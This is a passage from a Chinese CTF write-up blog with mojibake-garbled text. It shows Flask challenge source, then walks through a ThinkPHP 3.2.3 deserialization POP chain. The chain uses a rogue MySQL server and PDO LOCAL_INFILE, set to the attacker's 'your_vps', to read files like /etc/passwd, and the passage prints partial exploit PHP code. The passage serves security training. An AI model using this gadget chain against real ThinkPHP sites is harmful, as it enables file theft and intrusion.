&lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">zipfile&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ZipFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;temp.zip&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;w&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">z&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">e&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;detection.meta&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;detection.index&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;detection.data-00000-of-00001&amp;#39;&lt;/span>&lt;span style="color:#111">]:&lt;/span>
&lt;span style="color:#111">z&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">write&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;tf/detection_model/&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">arcname&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">e&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">send_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;temp.zip&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">as_attachment&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">attachment_filename&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;model.zip&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">except&lt;/span> &lt;span style="color:#75af00">Exception&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">flash&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">e&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">redirect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/admin&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;Not a admin **session**. &amp;lt;a href=&amp;#39;/&amp;#39;&amp;gt;Back&amp;lt;/a&amp;gt;&amp;#34;&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/admin&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">methods&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;GET&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;POST&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">ad&lt;/span> &lt;span style="color:#f92672">in&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#00a8c8">global&lt;/span> &lt;span style="color:#111">site_description&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">site_title&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">sess&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;admin&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">False&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;admin session.&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">method&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;POST&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">form&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;site_description&amp;#39;&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">site_description&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">form&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;site_description&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">form&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;site_title&amp;#39;&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">site_title&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">form&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;site_title&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">files&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;modelFile&amp;#39;&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">file&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">files&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;modelFile&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># print(file, type(file))&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">z&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">zipfile&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ZipFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">file&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">file&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">e&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;detection.meta&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;det ction.index&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;detection.data-00000-of-00001&amp;#39;&lt;/span>&lt;span style="color:#111">]:&lt;/span>
&lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;tf/detection_model/&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;wb&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">write&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">z&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">e&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">sess&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">renew&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sess&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">tf_path&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">flash&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Reloaded succe sfully&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">except&lt;/span> &lt;span style="color:#75af00">Exception&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">flash&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">e&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;admin.html&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;Not a admin **session**. &amp;lt;a href=&amp;#39;/&amp;#39;&amp;gt;Back&amp;lt;/a&amp;gt;&amp;#34;&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/admin/source&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e"># &amp;lt;--here â™‚ boy next door&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">get_source&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;app.py&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;utf8&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/admin/source_thanos&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">get_source_broken&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#d88200"> Thanos is eventually resurrected,[21] and collects the Infinity Gems once again.[22]
&lt;/span>&lt;span style="color:#d88200"> He uses the gems to create the Infinity Gauntlet, making himself omnipotent,
&lt;/span>&lt;span style="color:#d88200"> and erases half the living things in the universe to prove his love to Death.
&lt;/span>&lt;span style="color:#d88200"> &amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#111">t&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;app.py&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;utf8&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">tt&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">t&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">t&lt;/span>&lt;span style="color:#111">))]&lt;/span>
&lt;span style="color:#111">ll&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">list&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">t&lt;/span>&lt;span style="color:#111">)))&lt;/span>
&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">shuffle&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ll&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">ll&lt;/span>&lt;span style="color:#111">[:&lt;/span>&lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">t&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">//&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">]:&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">tt&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">tt&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39; &amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">tt&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>â€¦â€¦tensorflowï¼Œå®Œå…¨ä¸æ‡‚å•Šå“¥ï¼Œä½ è€ƒçš„çŸ¥è¯†å¤ªé«˜é›…äº†ï¼Œæˆ‘ä¿—äººä¸€ä¸ªï¼Œå’‹å°±è¾“å…¥ä¸€ä¸ªaaaaaabxCZCå°±æœ‰flagäº†å•Š&lt;/p>
&lt;p>&lt;a href="https://github.com/RManLuo/ciscn2019_final_web4">ä½œè€…wp&lt;/a>&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[çº¢æ˜Žè°·CTF 2021]EasyTP
&lt;/h4>
&lt;/summary>
&lt;p>tp3.2.3ï¼Œæœ‰ä¸€ä¸ªçŽ°æˆçš„é“¾å­ï¼š&lt;a href="https://f5.pm/go-53579.html">ThinkPHP v3.2.* ï¼ˆSQLæ³¨å…¥&amp;amp;æ–‡ä»¶è¯»å–ï¼‰ååºåˆ—åŒ–POPé“¾&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219155134609.png" alt="image-20211219155134609">&lt;/p>
&lt;p>çœ‹Application\Home\Controller\IndexController.class.phpçš„ä»£ç ä¹Ÿè·Ÿè¿™ä¸ªæ–‡ç« ä¸­çš„ç¤ºä¾‹ä»£ç å¤§å·®ä¸å·®ï¼Œé¡ºç€è¿™ç¯‡æ–‡ç« çš„æ€è·¯è·Ÿä¸€ä¸‹&lt;/p>
&lt;p>é¦–å…ˆæ˜¯å…¨å±€å¯»æ‰¾&lt;code>__destruct()&lt;/code>å‡½æ•°&lt;/p>
&lt;p>www/ThinkPHP/Library/Think/Image/Driver/Imagick.class.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219163343446.png" alt="image-20211219163343446">&lt;/p>
&lt;p>å¯»æ‰¾ä¸€ä¸ª&lt;code>destroy()&lt;/code>&lt;/p>
&lt;p>www/ThinkPHP/Library/Think/Session/Driver/Memcache.class.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219163445086.png" alt="image-20211219163445086">&lt;/p>
&lt;p>è¿™é‡Œéœ€è¦ä¸€ä¸ª&lt;code>$sessID&lt;/code>ï¼ŒPHP7ä¸‹ä¸ä¼ å‚ä¼šæŠ¥é”™ PHP5ä¸å½±å“ï¼Œ&lt;code>$this-&amp;gt;sessionName&lt;/code>å¯æŽ§ï¼›æŽ¥ç€æ‰¾å«æœ‰&lt;code>delete()&lt;/code>çš„ç±»&lt;/p>
&lt;p>www/ThinkPHP/Mode/Lite/Model.class.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219163653936.png" alt="image-20211219163653936">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219163713363.png" alt="image-20211219163713363">&lt;/p>
&lt;p>ç›¸å½“äºŽä¼ å…¥çš„å‚æ•°éƒ½å¯ç”¨ï¼Œå¯ä»¥æŽ§åˆ¶è‡ªå¸¦çš„æ•°æ®åº“ç±»çš„&lt;code>delete()&lt;/code>æ–¹æ³•äº†&lt;/p>
&lt;p>www/ThinkPHP/Library/Think/Db/Driver.class.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219170053771.png" alt="image-20211219170053771">&lt;/p>
&lt;p>å®ƒæ˜¯æ‹¼æŽ¥äº†$sqlè¯­å¥ï¼Œä¹‹åŽæ‰§è¡Œ&lt;code>$this-&amp;gt;execute()&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219171035987.png" alt="image-20211219171035987">&lt;/p>
&lt;p>å®ƒä¼šé¢„å…ˆè¿›è¡Œ&lt;code>$this-&amp;gt;initConnect()&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219171103370.png" alt="image-20211219171103370">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219171123961.png" alt="image-20211219171123961">&lt;/p>
&lt;p>æˆ‘ä»¬å¯ä»¥æŽ§åˆ¶&lt;code>$config&lt;/code>ï¼ŒæŽ§åˆ¶è¿žæŽ¥ä»»æ„æ•°æ®åº“&lt;/p>
&lt;p>è¿™é‡Œå¯ä»¥ç»“åˆMySQLæ¶æ„æœåŠ¡ç«¯è¯»å®¢æˆ·ç«¯æ–‡ä»¶è¿™ä¸ªæ´žäº†ï¼ˆé¢˜ç›®å¯ä»¥å‚è€ƒ&lt;a href="https://evoa.me/archives/4/#mysql%E5%BC%B1%E5%8F%A3%E4%BB%A4">[DDCTF 2020]mysqlå¼±å£ä»¤&lt;/a>ï¼‰ï¼Œåˆ©ç”¨è¿‡ç¨‹å°±æ˜¯è¿™æ ·ï¼š&lt;/p>
&lt;ul>
&lt;li>é€šè¿‡æŸå¤„æ³„éœ²å¾—åˆ°ç›®æ ‡çš„WEBç›®å½•ï¼ˆå¦‚DEBUGé¡µé¢&lt;/li>
&lt;li>å¼€å¯MySQLä¼ªæœåŠ¡ç«¯ï¼Œè¯»å–ç›®æ ‡çš„æ•°æ®åº“é…ç½®æ–‡ä»¶&lt;/li>
&lt;li>å‡ºå‘ååºåˆ—åŒ–&lt;/li>
&lt;li>è§¦å‘PDOè¿žæŽ¥éƒ¨åˆ†&lt;/li>
&lt;li>èŽ·å–åˆ°ç›®æ ‡çš„æ•°æ®åº“é…ç½®æ–‡ä»¶&lt;/li>
&lt;/ul>
&lt;p>ä»¥æœ¬é¢˜ä¸ºæ¼”ç¤ºï¼Œä½¿ç”¨bettercapåšmysqlä¼ªæœåŠ¡ç«¯è¯»ä¸€ä¸‹/etc/passwd&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Think\Db\Driver&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">PDO&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Mysql&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$options&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#75af00">PDO&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#75af00">MYSQL_ATTR_LOCAL_INFILE&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span> &lt;span style="color:#75715e">// å¼€å¯æ‰èƒ½è¯»å–æ–‡ä»¶
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$config&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#d88200">&amp;#34;debug&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;database&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;hostname&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;your_vps&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;hostport&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;port&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;charset&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;utf8&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;username&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;root&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;password&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;root&amp;#34;&lt;/span>
&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Think\Image\Driver&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">Think\Session\Driver\Memcache&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Imagick&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$img&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">img&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Memcache&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Think\Session\Driver&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">Think\Model&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Memcache&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$handle&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">handle&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Model&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Think&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">Think\Db\Driver\Mysql&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Model&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$options&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$pk&lt;/span>&lt;span style="color:#111">;&lt;/span>
